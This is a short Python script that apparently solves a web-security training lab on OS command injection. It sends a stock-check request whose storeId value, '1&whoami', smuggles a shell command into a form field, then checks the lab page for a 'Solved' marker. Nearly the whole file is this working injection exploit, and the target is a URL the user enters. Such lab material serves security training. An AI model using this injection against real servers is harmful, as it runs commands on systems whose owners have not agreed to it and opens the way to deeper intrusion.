import requests
import re

def urlEncode(str):
    return requests.utils.quote(str, safe='.')

def solve(session, domain):
    data = {
        'productId': '1',
        'storeId': '1&whoami',
    }
    payload_url = domain + '/product/stock'
    r = session.post(payload_url, data=data)
    print('After sending the payload')
    print(r.text)

def verify(session, domain):
    r = session.get(domain)
    if ('Solved' in r.text):
        print('Solved. Visit ' + domain + ' to see the solution.')
    else:
        print('Not solved yet.')
        
if __name__ == '__main__':
    url = input('Enter the URL the lab provide: ')
    domain = re.search(r'^(https?://[^/]+)', url).group(1)
    with requests.Session() as session:
        solve(session, domain)
        verify(session, domain)
    